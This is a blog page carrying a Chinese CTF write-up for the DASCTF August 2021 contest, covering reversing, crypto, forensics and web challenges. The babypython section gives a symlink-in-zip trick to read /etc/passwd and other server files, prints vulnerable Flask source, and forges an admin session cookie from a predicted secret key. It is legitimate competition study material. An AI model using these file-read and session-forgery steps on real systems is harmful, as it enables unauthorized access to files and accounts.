@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>DASCTF八月挑战赛writeup - Hannibal0x の Blog</title><meta name="Description" content="Hannibal0x的个人学习博客"><meta property="og:title" content="DASCTF八月挑战赛writeup" />
+<meta property="og:description" content="0x00 easymath 题目代码 1 2 3 assert(len(open(&#39;flag.txt&#39;, &#39;rb&#39;).read()) &lt; 50) assert(str(int.from_bytes(open(&#39;flag.txt&#39;, &#39;rb&#39;).read(), byteorder=&#39;big&#39;) &lt;&lt; 10000).endswith( &#39;1862790884563160582365888530869690397667546628710795031544304378154769559410473276482265448754388655981091313419549689169381115573539422545933044902527020209259938095466283008&#39;)) 简单搜索，发现https://ctftime.org/writeup/22374有道类似的题目，修改后" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://hannibal0x.github.io/2021-08-31-dasctf%E5%85%AB%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9Bwriteup/" /><meta property="og:image" content="https://hannibal0x.github.io/images/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-08-31T15:14:00+00:00" />
+<meta property="article:modified_time" content="2021-08-31T15:14:00+00:00" /><meta property="og:site_name" content="Hannibal0x の Blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://hannibal0x.github.io/images/logo.png"/>
+
+<meta name="twitter:title" content="DASCTF八月挑战赛writeup"/>
+<meta name="twitter:description" content="0x00 easymath 题目代码 1 2 3 assert(len(open(&#39;flag.txt&#39;, &#39;rb&#39;).read()) &lt; 50) assert(str(int.from_bytes(open(&#39;flag.txt&#39;, &#39;rb&#39;).read(), byteorder=&#39;big&#39;) &lt;&lt; 10000).endswith( &#39;1862790884563160582365888530869690397667546628710795031544304378154769559410473276482265448754388655981091313419549689169381115573539422545933044902527020209259938095466283008&#39;)) 简单搜索，发现https://ctftime.org/writeup/22374有道类似的题目，修改后"/>
+<meta name="application-name" content="Hannibal0x の Blog">
+<meta name="apple-mobile-web-app-title" content="Hannibal0x の Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/images/logo.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://hannibal0x.github.io/2021-08-31-dasctf%E5%85%AB%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9Bwriteup/" /><link rel="prev" href="https://hannibal0x.github.io/2021-08-27-2021%E5%B9%B4%E6%9A%91%E6%9C%9F%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%AC%94%E8%AE%B0day7-day8/" /><link rel="next" href="https://hannibal0x.github.io/2021-09-15-pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B-%E8%BF%8E%E4%B8%AD%E7%A7%8Bbabyexec/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "DASCTF八月挑战赛writeup",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/hannibal0x.github.io\/2021-08-31-dasctf%E5%85%AB%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9Bwriteup\/"
+        },"genre": "posts","keywords": "CTF","wordcount":  2232 ,
+        "url": "https:\/\/hannibal0x.github.io\/2021-08-31-dasctf%E5%85%AB%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9Bwriteup\/","datePublished": "2021-08-31T15:14:00+00:00","dateModified": "2021-08-31T15:14:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Hannibal0x"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Hannibal0x の Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo.png"
+        data-srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+        data-sizes="auto"
+        alt="/images/logo.png"
+        title="/images/logo.png" width="32" height="32" />Hannibal0x の Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"><i class='fas fa-book'></i> 文章 </a><a class="menu-item" href="/tags/"><i class='fas fa-tags'></i> 标签 </a><a class="menu-item" href="/categories/"><i class='fas fa-folder'></i> 分类 </a><a class="menu-item" href="/categories/writeup"><i class='fas fa-flag'></i> CTF </a><a class="menu-item" href="/about/"><i class='fas fa-key'></i> 关于 </a><a class="menu-item" href="http://hannibal0x.top" rel="noopener noreffer" target="_blank"><i class='fas fa-history'></i> 旧博客 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="都几岁啦，还这么害羞，让我康康！" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Hannibal0x の Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo.png"
+        data-srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+        data-sizes="auto"
+        alt="/images/logo.png"
+        title="/images/logo.png" width="32" height="32" />Hannibal0x の Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="都几岁啦，还这么害羞，让我康康！" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title=""><i class='fas fa-book'></i>文章</a><a class="menu-item" href="/tags/" title=""><i class='fas fa-tags'></i>标签</a><a class="menu-item" href="/categories/" title=""><i class='fas fa-folder'></i>分类</a><a class="menu-item" href="/categories/writeup" title=""><i class='fas fa-flag'></i>CTF</a><a class="menu-item" href="/about/" title=""><i class='fas fa-key'></i>关于</a><a class="menu-item" href="http://hannibal0x.top" title="" rel="noopener noreffer" target="_blank"><i class='fas fa-history'></i>旧博客</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">DASCTF八月挑战赛writeup</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Hannibal0x</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeup/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>WriteUp</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2021-08-31">2021-08-31</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;2232 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;5 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x00-easymath">0x00 easymath</a></li>
+    <li><a href="#0x01-寒王s-blog">0x01 寒王&rsquo;s blog</a></li>
+    <li><a href="#0x02-py">0x02 py</a></li>
+    <li><a href="#0x03-apkrev">0x03 apkrev</a></li>
+    <li><a href="#0x04-babypython国赛总决赛复现">0x04 babypython[国赛总决赛复现]</a></li>
+    <li><a href="#0x05-stealer">0x05 stealer</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><div class="has-toc have-toc">
+</div>
+<h2 id="0x00-easymath">0x00 easymath</h2>
+<p>题目代码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">assert(len(open(&#39;flag.txt&#39;, &#39;rb&#39;).read()) &lt; 50)
+</span></span><span class="line"><span class="cl">assert(str(int.from_bytes(open(&#39;flag.txt&#39;, &#39;rb&#39;).read(), byteorder=&#39;big&#39;) &lt;&lt; 10000).endswith(
+</span></span><span class="line"><span class="cl"> &#39;1862790884563160582365888530869690397667546628710795031544304378154769559410473276482265448754388655981091313419549689169381115573539422545933044902527020209259938095466283008&#39;))
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>简单搜索，发现<a rel="noreferrer noopener" href="https://ctftime.org/writeup/22374" target="_blank" rel="nofollow" ><a href="https://ctftime.org/writeup/22374" target="_blank" rel="noopener noreffer ">https://ctftime.org/writeup/22374</a></a>有道类似的题目，修改后跑一下脚本。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">c</span> <span class="o">=</span> <span class="mi">1862790884563160582365888530869690397667546628710795031544304378154769559410473276482265448754388655981091313419549689169381115573539422545933044902527020209259938095466283008</span>
+</span></span><span class="line"><span class="cl"><span class="n">mod</span> <span class="o">=</span> <span class="mi">5</span> <span class="o">**</span> <span class="mi">175</span>
+</span></span><span class="line"><span class="cl"><span class="n">phi</span> <span class="o">=</span> <span class="mi">5</span> <span class="o">**</span> <span class="mi">175</span> <span class="o">-</span> <span class="mi">5</span> <span class="o">**</span> <span class="mi">174</span>
+</span></span><span class="line"><span class="cl"><span class="n">inv</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="nb">pow</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">10000</span><span class="p">,</span> <span class="n">mod</span><span class="p">),</span> <span class="n">phi</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">mod</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(((</span><span class="n">c</span> <span class="o">*</span> <span class="n">inv</span><span class="p">)</span> <span class="o">%</span> <span class="n">mod</span><span class="p">)</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">50</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s1">&#39;big&#39;</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" width="928" height="25" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-305.png" alt="" class="wp-image-3418" /> </figure></p>
+<h2 id="0x01-寒王s-blog">0x01 寒王&rsquo;s blog</h2>
+<p>题目：<a href="http://hanwang2333.gitee.io/" target="_blank"  rel="nofollow" ><a href="http://hanwang2333.gitee.io/" target="_blank" rel="noopener noreffer ">http://hanwang2333.gitee.io/</a></a> 你滴寒王写了blog，看看寒王不小心留下了什么信息？</p>
+<p>猜测需要找到flag.jpg<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1449" height="768" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-306.png" alt="" class="wp-image-3419" /> </figure></p>
+<p>扫描后台没有结果，因为blog是部署在码云上的，所以去看看。果然在一个分支里面找到了。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1124" height="546" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-307.png" alt="" class="wp-image-3420" /> </figure></p>
+<p>按照blog上的操作解密一下，得到<code>flag{50aa7fe02602264e7d8102746416cd74}</code>。</p>
+<h2 id="0x02-py">0x02 py</h2>
+<p>下载下来是个py.exe，没做过这种逆向的，参考<a rel="noreferrer noopener" href="https://www.cnblogs.com/pluie/p/13621823.html" target="_blank" rel="nofollow" ><a href="https://www.cnblogs.com/pluie/p/13621823.html" target="_blank" rel="noopener noreffer ">https://www.cnblogs.com/pluie/p/13621823.html</a></a>和<a rel="noreferrer noopener" href="https://blog.csdn.net/weixin_44013208/article/details/88544142" target="_blank" rel="nofollow" ><a href="https://blog.csdn.net/weixin_44013208/article/details/88544142" target="_blank" rel="noopener noreffer ">https://blog.csdn.net/weixin_44013208/article/details/88544142</a></a>，用<a rel="noreferrer noopener" href="https://github.com/countercept/python-exe-unpacker/blob/master/pyinstxtractor.py" target="_blank" rel="nofollow" >pyinstxtractor</a>把exe转为pyc文件。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1462" height="311" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-308.png" alt="" class="wp-image-3421" /> </figure></p>
+<p>找到py文件，在用010editor打开，插入<code>03F30D0A000000</code>，将其重命名为py.pyc。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="729" height="178" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-309.png" alt="" class="wp-image-3422" /> </figure></p>
+<p>再用如下命令，转成python程序</p>
+<pre class="wp-block-code"><code>uncompyle6 -o 生成文件.py 目标文件.pyc</code></pre>
+<p>代码：</p>
+<pre class="wp-block-code"><code>
+def encode(s):
+    str = ''
+    for i in range(len(s)):
+        res = ord(s&#91;i]) ^ 32
+        res += 31
+        str += chr(res)
+
+    return str
+
+
+m = 'ek`fz13b3c5e047b`bd`0/c268e600e7c5d1`|'
+strings = ''
+strings = input('Input:')
+if encode(strings) == m:
+    print 'Correct!'
+else:
+    print 'Try again!'</code></pre>
+<p>写个简单的解密</p>
+<pre class="wp-block-code"><code>m = 'ek`fz13b3c5e047b`bd`0/c268e600e7c5d1`|'
+str = ''
+for i in range(len(m)):
+	res = ord(m&#91;i]) - 31
+	res = res ^ 32
+	str += chr(res)
+print (str)</code></pre>
+<p>得到结果<code>flag{24c4d6f158cacea10d379f711f8d6e2a}</code></p>
+<h2 id="0x03-apkrev">0x03 apkrev</h2>
+<p>用模拟器打开<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-310.png" alt="" class="wp-image-3424" width="201" height="306" /> </figure></p>
+<p>jeb反编译后发现，加密函数和密文都在libnative-test.so这个文件里面。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1504" height="623" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-342.png" alt="" class="wp-image-3504" /> </figure></p>
+<p>找到x86下对应的文件，进入ida分析，在函数窗口搜索mycheck就能定位。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1181" height="706" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片-8.png" alt="" class="wp-image-3555" /> </figure></p>
+<p>貌似需要用到动态调试，这里先留一个坑。<a rel="noreferrer noopener" href="https://blog.csdn.net/freeking101/article/details/106701908" target="_blank" rel="nofollow" ><a href="https://blog.csdn.net/freeking101/article/details/106701908" target="_blank" rel="noopener noreffer ">https://blog.csdn.net/freeking101/article/details/106701908</a></a>、<a rel="noreferrer noopener" href="https://bbs.pediy.com/thread-269129.htm" target="_blank" rel="nofollow" ><a href="https://bbs.pediy.com/thread-269129.htm" target="_blank" rel="noopener noreffer ">https://bbs.pediy.com/thread-269129.htm</a></a></p>
+<h2 id="0x04-babypython国赛总决赛复现">0x04 babypython[国赛总决赛复现]</h2>
+<p>这题拿了先搜一下，发现和[HCTF 2018]Hide and seek很相似，于是参考<a href="https://blog.csdn.net/mochu7777777/article/details/105190181/" data-type="URL" data-id="https://blog.csdn.net/mochu7777777/article/details/105190181/" target="_blank" rel="noreferrer noopener" rel="nofollow" >文章</a>。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="552" height="138" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-332.png" alt="" class="wp-image-3488" /> </figure></p>
+<p>创建一个软链接指向服务器上的文件，试试看能不能读取。</p>
+<pre class="wp-block-code"><code>ln -s /etc/passwd link1
+zip -y link1.zip link1</code></pre>
+<p>发现成功读到了。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1883" height="156" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-333.png" alt="" class="wp-image-3489" /> </figure></p>
+<p>尝试读取<code>/proc/self/environ</code>提示you bad bad!，怀疑这里被过滤了。</p>
+<pre class="wp-block-code"><code>linux提供了/proc/self/目录，这个目录比较独特，不同的进程访问该目录时获得的信息是不同的，
+内容等价于/proc/本进程pid/。进程可以通过访问/proc/self/目录来获取自己的信息。
+
+
+maps 记录一些调用的扩展或者自定义 so 文件
+
+environ 环境变量
+
+comm 当前进程运行的程序
+
+cmdline 程序运行的绝对路径
+
+cpuset docker 环境可以看 machine ID
+
+cgroup docker环境下全是 machine ID 不太常用</code></pre>
+<p>根据之前的writeup，admin账号应该就是靠cookie或者session验证的，所以查看一下页面cookie信息。确实发现了一个session。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="556" height="51" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-334.png" alt="" class="wp-image-3491" /> </figure></p>
+<p>在<a rel="noreferrer noopener" href="https://jwt.io/#debugger-io" target="_blank" rel="nofollow" ><a href="https://jwt.io/#debugger-io" target="_blank" rel="noopener noreffer ">https://jwt.io/#debugger-io</a></a>上面解析一下。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1132" height="236" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-335.png" alt="" class="wp-image-3492" /> </figure></p>
+<p>参考大佬的过程<a rel="noreferrer noopener" href="https://www.wolai.com/atao/hf4yLDPzB1rq471j4HMXDe" target="_blank" rel="nofollow" ><a href="https://www.wolai.com/atao/hf4yLDPzB1rq471j4HMXDe" target="_blank" rel="noopener noreffer ">https://www.wolai.com/atao/hf4yLDPzB1rq471j4HMXDe</a></a>，是通过<code>/app/y0u_found_it.ini</code>来获取，不是很能理解为什么跳到这一步了。这里尝试绕过，但没有成功，迷茫。不过省去这两步，直接当原题套过程也能拿到flag。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="610" height="26" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-338.png" alt="" class="wp-image-3496" /> </figure></p>
+<p>接着试<code>/app/y0u_found_it/y0u_found_it_main.py</code>，获取到源代码。</p>
+<pre class="wp-block-code"><code># -*- coding: utf-8 -*-
+from flask import Flask,session,render_template,redirect, url_for, escape, request,Response
+import uuid
+import base64
+import random
+import secret
+from werkzeug.utils import secure_filename
+import os
+random.seed(uuid.getnode())
+app = Flask(__name__)
+app.config&#91;'SECRET_KEY'] = str(random.random()*100)
+app.config&#91;'UPLOAD_FOLDER'] = './uploads'
+app.config&#91;'MAX_CONTENT_LENGTH'] = 100 * 1024
+ALLOWED_EXTENSIONS = set(&#91;'zip'])
+
+def allowed_file(filename):
+    return '.' in filename and \
+           filename.rsplit('.', 1)&#91;1].lower() in ALLOWED_EXTENSIONS
+
+
+@app.route('/', methods=&#91;'GET'])
+def index():
+    error = request.args.get('error', '')
+    
+    if(error == '1'):
+        session.pop('username', None)
+        return render_template('index.html', forbidden=1)
+    if not 'username' in session:
+        session&#91;'username'] = "guest"
+    
+    if 'username' in session:
+        return render_template('index.html', user=session&#91;'username'], secret=secret.secret)
+    else:
+        
+        return render_template('index.html')
+
+
+@app.route('/upload', methods=&#91;'POST'])
+def upload_file():
+    if 'the_file' not in request.files:
+        return redirect(url_for('index'))
+    file = request.files&#91;'the_file']
+    if file.filename == '':
+        return redirect(url_for('index'))
+    if file and allowed_file(file.filename):
+        filename = secure_filename(file.filename)
+        file_save_path = os.path.join(app.config&#91;'UPLOAD_FOLDER'], filename)
+        if(os.path.exists(file_save_path)):
+            return 'This file already exists'
+        file.save(file_save_path)
+    else:
+        return 'This file is not a zipfile'
+
+
+    try:
+        extract_path = file_save_path + '_'
+        os.system('unzip -n ' + file_save_path + ' -d '+ extract_path)
+        read_obj = os.popen('cat ' + extract_path + '/*')
+        file = read_obj.read()
+        read_obj.close()
+        os.system('rm -rf ' + extract_path)
+    except Exception as e:
+        file = None
+    
+    os.remove(file_save_path)
+    if(file != None):
+        if(file.find(base64.b64decode('ZmxhZw==').decode('utf-8')) != -1):
+            return redirect(url_for('index', error=1))
+    return Response(file)
+
+
+if __name__ == '__main__':
+    #app.run(debug=True)
+    app.run(host='127.0.0.1', debug=False, port=10008)</code></pre>
+<p>分析<code>app.config['SECRET_KEY'] = str(random.random()*100)</code>可以发现，所谓的SECRET_KEY是由随机数生成的一串字符串，而设置随机数种子的<code>random.seed(uuid.getnode())</code>的函数可以获取网卡mac地址并转换成十进制数返回，进而生成伪随机数。查找资料发现，可以通过<code>/sys/class/net/eth0/address</code>来获取MAC地址。<figure class="wp-block-image is-resized"></p>
+<p><img loading="lazy" src="https://img-blog.csdnimg.cn/20200714002326306.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NyaXNwcng=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" width="462" height="182" /> </figure></p>
+<p>获取到为<code>02:42:ac:10:98:e8</code>，跑下一脚本</p>
+<pre class="wp-block-code"><code>import uuid
+import random
+
+mac = "02:42:ac:10:98:e8"
+temp = mac.split(':')
+temp = &#91;int(i,16) for i in temp]
+temp = &#91;bin(i).replace('0b','').zfill(8) for i in temp]
+temp = ''.join(temp)
+mac = int(temp,2)
+random.seed(mac)
+randStr = str(random.random()*100)
+print(randStr)</code></pre>
+<p>得到结果<code>77.82254010793636</code>，再用flask-session-cookie-manager工具加密下，得到admin的sessio。</p>
+<pre class="wp-block-code"><code>python3 flask_session_cookie_manager3.py encode -s '77.82254010793636' -t "{u'username':u'admin'}"</code></pre>
+<p>bp抓包提交下<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="967" height="341" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/09/图片.png" alt="" class="wp-image-3511" /> </figure></p>
+<h2 id="0x05-stealer">0x05 stealer</h2>
+<p>题目：那女孩对我说说我是一个小偷</p>
+<p>打开后<code>dns and ip.src==172.27.221.13</code>过滤一下，发现存在base64的图片<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="806" height="266" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-340.png" alt="" class="wp-image-3500" /> </figure></p>
+<p>使用<code>tshark -r &quot;dump.pcapng&quot; -R &quot;dns and ip.src==172.27.221.13&quot; -2 -T fields -e _ws.col.Info&gt;1.txt</code>命令提取所有的info字段。然后进行处理</p>
+<pre class="wp-block-code"><code>操作：
+1、去除多余字符串”Standard query 0x.* A”、”ctf.com.cn OPT”、”-.”、“.”
+2、将“*”替换为“+”
+3、去掉换行</code></pre>
+<p>然后丢到cyberchef里面去<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="788" height="525" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-341.png" alt="" class="wp-image-3502" /> </figure></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2021-08-31</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/2021-08-31-dasctf%E5%85%AB%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9Bwriteup/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://hannibal0x.github.io/2021-08-31-dasctf%E5%85%AB%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9Bwriteup/" data-title="DASCTF八月挑战赛writeup" data-hashtags="CTF"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://hannibal0x.github.io/2021-08-31-dasctf%E5%85%AB%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9Bwriteup/" data-hashtag="CTF"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://hannibal0x.github.io/2021-08-31-dasctf%E5%85%AB%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9Bwriteup/" data-title="DASCTF八月挑战赛writeup"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://hannibal0x.github.io/2021-08-31-dasctf%E5%85%AB%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9Bwriteup/" data-title="DASCTF八月挑战赛writeup"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://hannibal0x.github.io/2021-08-31-dasctf%E5%85%AB%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9Bwriteup/" data-title="DASCTF八月挑战赛writeup"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/ctf/">CTF</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2021-08-27-2021%E5%B9%B4%E6%9A%91%E6%9C%9F%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%AC%94%E8%AE%B0day7-day8/" class="prev" rel="prev" title="2021年暑期夏令营笔记(day7-day8)"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>2021年暑期夏令营笔记(day7-day8)</a>
+            <a href="/2021-09-15-pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B-%E8%BF%8E%E4%B8%AD%E7%A7%8Bbabyexec/" class="next" rel="next" title="pwnhub公开赛-【迎中秋】BabyExec">pwnhub公开赛-【迎中秋】BabyExec<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="utterances" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">utterances</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.101.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
